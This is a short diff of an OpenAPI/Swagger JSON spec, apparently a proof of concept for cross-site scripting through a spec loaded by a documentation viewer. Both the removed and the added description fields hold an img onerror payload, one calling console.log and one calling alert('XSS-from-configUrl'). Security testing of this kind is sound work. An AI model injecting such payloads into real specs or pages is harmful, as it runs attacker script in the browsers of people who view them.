@@ -1,10 +1,9 @@
 {
-  "openapi":"3.0.0",
-  "info":{
-    "title":"PoC (safe demo)",
-    "version":"1.0.0",
-       "description":"<img src=\"https://nonexistent.invalid/x.png\" onerror=\"console.log('poc: img onerror')\">"
+  "swagger": "2.0",
+  "info": {
+    "version": "v1",
+    "title": "CatSafetyServices.WebApp",
+    "description": "<img src=x onerror=\"alert('XSS-from-configUrl')\">"
   },
   "paths": {}
 }
-
